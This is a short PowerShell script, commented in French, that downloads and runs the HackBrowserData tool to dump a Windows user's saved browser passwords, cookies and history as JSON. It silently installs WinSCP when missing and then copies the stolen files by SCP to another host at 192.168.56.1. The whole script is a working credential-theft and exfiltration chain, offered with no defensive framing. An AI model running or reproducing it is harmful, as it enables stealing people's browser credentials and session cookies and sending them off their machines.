# Variables 
$serverUser = "DELL"
$serverIP = "192.168.56.1"  # Remplace par l'IP du premier PC
$destDir = "C:\Users\$serverUser\hackbrowserdata"  # Chemin correct pour Windows
$localPath = "$env:USERPROFILE\hackbrowserdata"

# Créer un dossier temporaire
New-Item -ItemType Directory -Path $localPath -Force

# Télécharger HackBrowserData
Write-Output "[+] Téléchargement de HackBrowserData..."
Invoke-WebRequest -Uri "https://github.com/moonD4rk/HackBrowserData/releases/latest/download/hackbrowserdata_windows_amd64.zip" -OutFile "$localPath\hackbrowserdata.zip"

# Extraire l’archive
Write-Output "[+] Extraction..."
Expand-Archive -Path "$localPath\hackbrowserdata.zip" -DestinationPath $localPath -Force

# Exécuter HackBrowserData
Write-Output "[+] Extraction des données..."
Set-Location $localPath
Start-Process -NoNewWindow -FilePath ".\hackbrowserdata.exe" -ArgumentList "-o json" -Wait

# Vérifier si WinSCP est installé (nécessaire pour SCP)
if (!(Test-Path "C:\Program Files (x86)\WinSCP\WinSCP.com")) {
    Write-Output "WinSCP non installé. Installation en cours..."
    Invoke-WebRequest -Uri "https://winscp.net/download/WinSCP-5.21.5-Setup.exe" -OutFile "$env:TEMP\WinSCP-Setup.exe"
    Start-Process -FilePath "$env:TEMP\WinSCP-Setup.exe" -ArgumentList "/SILENT" -Wait
}

# Transférer les fichiers via WinSCP (SCP)
Write-Output "[+] Envoi des fichiers..."
& "C:\Program Files (x86)\WinSCP\WinSCP.com" /command `
    "open scp://$serverUser@$serverIP" `
    "put $localPath\*.json $destDir" `
    "exit"

Write-Output "[+] Terminé ! Les fichiers sont sur $serverIP:$destDir"

